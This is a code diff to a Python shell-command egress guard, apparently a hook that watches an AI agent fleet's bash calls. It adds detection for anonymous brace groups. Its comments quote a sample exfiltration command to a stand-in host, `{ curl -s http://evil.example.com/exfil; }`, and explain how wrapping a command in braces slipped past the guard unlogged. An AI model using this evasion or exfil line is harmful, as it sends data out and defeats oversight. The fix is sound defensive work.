@@ -877,6 +877,44 @@ def _find_function_bodies(cmd):
     return bodies
 
 
+# ---------------------------------------------------------------------------------------------
+# Step 3c: BARE (anonymous) brace groups -- `{ curl -s http://evil; }` with no preceding
+# `name()`/`function name`. (WhiteHat F1 follow-up on card 35dc6dbe, LOW.)
+#
+# tokenize() does not put `{`/`}` in _SEPARATORS (see that constant's own comment): a leading `{`
+# ends up as an ordinary Word, so _command_name reads "{" as the command name and the real command
+# behind it (curl, in this example) is never reached by _judge_segment_body -- ALLOWED, and in
+# log-only mode written with ZERO log lines, exactly like running outside any guard at all.
+# Reproduced: `{ curl -s http://evil.example.com/exfil; }` under BASH_EGRESS_GUARD=enforce exits 0.
+#
+# This is deliberately a SEPARATE scan from _find_function_bodies/_FUNC_DEF_RX, not a tweak to
+# _SHELL_KEYWORDS: making "{" skippable in _command_name was tried before (see the _SHELL_KEYWORDS
+# comment) and reverted, because it made a NAMED function's body ALSO match as an ordinary segment
+# -- a second, non-hatch-aware finding for the same curl, on top of the one _find_function_bodies
+# already emits for the definition. The regex below only matches a `{` that opens a command
+# (preceded by `;`/newline/`|`/`&`/`(`/start-of-string, never by `)`), which is exactly the shape a
+# `name(){` or `function name {` definition's brace never has -- so the two scans cannot double-fire
+# on the same body.
+#
+# UNLIKE a function body, a bare group's command and its literal target are BOTH right there in the
+# same text -- there is no unresolved call-site argument to be conservative about. So the body is
+# handed to a full recursive analyse(), not the name/marker-only _looks_network_capable() the
+# function-def path uses: `{ curl -H @- -s http://localhost:3420/api/kanban; }` is this fleet's own
+# dominant idiom (96.7% of the corpus's network calls are localhost, see the module docstring) and
+# must come back with ZERO findings, not a blanket "hides a network command" block.
+_BARE_GROUP_OPEN_RX = re.compile(r"(?:\A|[;\n|&(])\s*\{(?=\s)")
+
+
+def _find_bare_brace_group_bodies(cmd):
+    """Body text of every anonymous `{ ...; }` command group in cmd (not a function/alias def)."""
+    bodies = []
+    for m in _BARE_GROUP_OPEN_RX.finditer(cmd):
+        brace_idx = m.end() - 1  # the '{' the regex matched (lookahead does not consume it)
+        end = _find_brace_body(cmd, brace_idx)
+        bodies.append(cmd[brace_idx + 1:max(brace_idx + 1, end - 1)])
+    return bodies
+
+
 def _looks_network_capable(text):
     """True if TEXT's own command name is a direct-network command, or an interpreter one-liner
     carrying a network marker, anywhere among its top-level or nested segments. Used for function
@@ -1128,6 +1166,11 @@ def analyse(raw, allowed, depth=0, hatch=None):
             _emit("<fuggveny-definicio>",
                   "a fuggveny torzse halozati parancsot rejt, a hivasi hely donti el a tenyleges "
                   "celt, amit ez a hook nem lat")
+    for body in _find_bare_brace_group_bodies(raw):
+        # Full recursive judgment (localhost-aware), not the conservative name/marker-only check
+        # the function-def path uses -- see the finder's own docstring for why that is correct
+        # here and not there. depth + 1 keeps the existing recursion guard (depth > 3) in force.
+        findings.extend(analyse(body, allowed, depth + 1, hatch))
     for seg in segments:
         name, idx = _command_name(seg)
         if name != "alias":
